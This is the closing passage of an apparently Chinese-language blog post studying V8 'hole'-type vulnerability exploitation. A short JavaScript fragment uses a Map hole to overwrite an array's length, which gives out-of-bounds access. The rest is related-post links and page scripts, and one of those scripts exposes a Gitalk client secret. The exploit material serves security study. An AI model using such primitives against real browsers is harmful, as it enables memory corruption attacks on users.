class="title function_">set</span>(<span class="number">37</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> tmp_arr = [<span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> rw_arr = [<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [<span class="number">0xeada</span>, rw_arr];</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;oob_arr.length&quot;</span>, oob_arr.<span class="property">length</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x2002</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;oob_arr.length&quot;</span>, oob_arr.<span class="property">length</span>);</span><br></pre></td></tr></table></figure>
<p>需要爆破key2，然后可以修改oob_arr.length的值</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2493725.html">V8 hole 类型漏洞利用总结</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://eknight-eutopia.github.io">Eutopia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://eknight-eutopia.github.io/posts/332a3199.html">https://eknight-eutopia.github.io/posts/332a3199.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://eknight-eutopia.github.io" target="_blank">Small Utopia</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/cover/default_cover%20(16).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/dc9665bb.html" title="GoogleCTF 2022 d8 Write Up"><img class="cover" src="/img/cover/default_cover%20(9).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">GoogleCTF 2022 d8 Write Up</div></div><div class="info-2"><div class="info-item-1">有一位大佬分享了当时的wp思路，网上似乎没找到中文版的wp，在此做翻译记录和学习。 概览题目目录文件： 12345678910base ❯ tree -L 1.├── build.Dockerfile├── challenge├── launcher.py├── Makefile.txt├── snapshot_blob.bin└── v8.patch0 directories, 6 files 根据v8.patch文件可知定义了/srv/challenge/runner.cc文件作为题目。 12345-DEFINE_BOOL(wasm_write_protect_code_memory, true,+DEFINE_BOOL(wasm_write_protect_code_memory, false,             &quot;write protect code memory on the wasm native heap with mprotect&quot;) 主要逻辑为challenge二进制程序接收用户输入（大小不超过65536）binary...</div></div></div></a><a class="pagination-related" href="/posts/f97d3541.html" title="V8 Map对象学习"><img class="cover" src="/img/cover/default_cover%20(8).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">V8 Map对象学习</div></div><div class="info-2"><div class="info-item-1">学习一下V8的Map对象，以下基本为对参考链接的文章的翻译转载。 引入ECMAScript 2015，也被成为ES6，引入了很多内置类型，例如Map、Set、WeakMap、WeakSet。他们是对标准JS库的扩展并在其他库，应用以及Node.js Core中广泛使用。今天我们关注于Map类型并且尝试去理解V8中的该类型实现细节，同时做一些总结。规范并没有规定用于实现Map类型的精确算法，而是为可能的实现以及预期的性能特征提供了一些建议：  Map object must be implemented using either hash tables or other mechanisms that, on average, provide access times that are sublinear on the number of elements in the collection. The data structures used in this Map objects specification is only intended to describe the...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#V8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">V8源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#map-set"><span class="toc-number">1.1.</span> <span class="toc-text">map.set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#map-delete"><span class="toc-number">1.2.</span> <span class="toc-text">map.delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">相关例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Eutopia</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const initGitalk = () => {
    const gitalk = new Gitalk(Object.assign({
      clientID: '4c4d7e363cc61fad04a9',
      clientSecret: '93995fa6ff1a993b19e99287b2c362230cb33f11',
      repo: 'eknight-eutopia.github.io',
      owner: 'Eknight-Eutopia',
      admin: ['Eknight-Eutopia'],
      id: '8cc24b51dc111ade39cb74b28cb5a42a',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  const loadGitalk = async() => {
    if (typeof Gitalk === 'function') initGitalk()
    else {
      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
      initGitalk()
    }
  }
  
  const commentCount = n => {
    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
    if (isCommentCount) {
      isCommentCount.textContent= n
    }
  }

  if ('Gitalk' === 'Gitalk' || !false) {
    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
    else loadGitalk()
  } else {
    window.loadOtherComment = loadGitalk
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>